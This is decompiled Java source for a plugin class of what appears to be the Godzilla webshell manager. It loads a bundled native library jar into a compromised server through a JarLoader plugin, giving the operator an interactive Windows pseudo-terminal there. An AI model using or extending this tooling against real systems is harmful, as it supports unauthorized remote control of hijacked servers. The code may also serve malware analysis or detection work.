/*    */ package shells.plugins.java;
/*    */ 
/*    */ import core.annotation.PluginAnnotation;
/*    */ import core.ui.ShellManage;
/*    */ import core.ui.component.dialog.GOptionPane;
/*    */ import java.awt.Component;
/*    */ import shells.plugins.generic.RealCmd;
/*    */ import shells.plugins.generic.SuperTerminal;
/*    */ import util.Log;
/*    */ import util.functions;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "SuperTerminal", DisplayName = "超级终端")
/*    */ public class JSuperTerminal
/*    */   extends SuperTerminal
/*    */ {
/*    */   private JarLoader jarLoader;
/*    */   
/*    */   public RealCmd getRealCmd() {
/* 26 */     RealCmd plugin = (RealCmd)this.shellEntity.getFrame().getPlugin("RealCmd");
/* 27 */     if (plugin != null) {
/* 28 */       return plugin;
/*    */     }
/* 30 */     GOptionPane.showMessageDialog(getView(), "未找到HttpProxy插件!", "提示", 0);
/*    */     
/* 32 */     return null;
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public boolean winptyInit(String tmpCommand) throws Exception {
/* 38 */     boolean superRet = super.winptyInit(tmpCommand);
/*    */     try {
/* 40 */       if (this.jarLoader == null) {
/* 41 */         ShellManage shellManage = this.shellEntity.getFrame();
/* 42 */         this.jarLoader = (JarLoader)shellManage.getPlugin("JarLoader");
/*    */       } 
/* 44 */     } catch (Exception e) {
/* 45 */       GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "no find plugin JarLoader!");
/* 46 */       throw new RuntimeException("no find plugin JarLoader!");
/*    */     } 
/* 48 */     if (superRet) {
/* 49 */       if (!this.jarLoader.hasClass("jna.pty4j.windows.WinPtyProcess") && 
/* 50 */         !this.jarLoader.loadJar(functions.readInputStreamAutoClose(getClass().getResourceAsStream("assets/GodzillaJna.jar")))) {
/* 51 */         Log.log("加载GodzillaJna失败", new Object[0]);
/*    */       }
/*    */       
/* 54 */       return true;
/*    */     } 
/* 56 */     return superRet;
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\java\JSuperTerminal.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */